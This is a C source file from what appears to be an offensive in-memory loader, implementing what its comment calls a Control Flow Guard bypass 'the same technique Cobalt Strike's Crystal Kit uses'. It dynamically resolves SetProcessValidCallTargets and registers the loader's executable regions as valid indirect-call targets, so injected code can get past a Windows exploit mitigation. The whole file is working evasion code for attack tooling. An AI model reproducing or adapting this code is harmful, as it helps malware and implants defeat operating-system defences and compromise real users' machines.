/* Control Flow Guard bypass: register loader-owned executable
 * regions as valid indirect-call targets, the same technique
 * Cobalt Strike's Crystal Kit uses. Best-effort: without CFG
 * enforcement (or on failure) the loader runs unchanged. */
#include "loader.h"
#include "services.h"

typedef struct {
    ULONG_PTR offset;
    ULONG flags;
} CFG_CALL_TARGET_INFO;

typedef int (*SetProcessValidCallTargets_t)(HANDLE, PVOID, SIZE_T, ULONG, CFG_CALL_TARGET_INFO *);

void cfg_register(void *base, size_t size) {
#ifndef PALACE_CFG
    (void)base;
    (void)size;
#else
    if (!base || !size)
        return;
    HMODULE kb = _LoadLibraryA("KernelBase.dll");
    if (!kb)
        return;
    SetProcessValidCallTargets_t f =
        (SetProcessValidCallTargets_t)_GetProcAddress(kb, "SetProcessValidCallTargets");
    if (!f)
        return;
    CFG_CALL_TARGET_INFO info;
    info.offset = 0;
    info.flags = 1; /* CFG_CALL_TARGET_VALID */
    f((HANDLE)(intptr_t)-1, base, size, 1, &info);
#endif
}
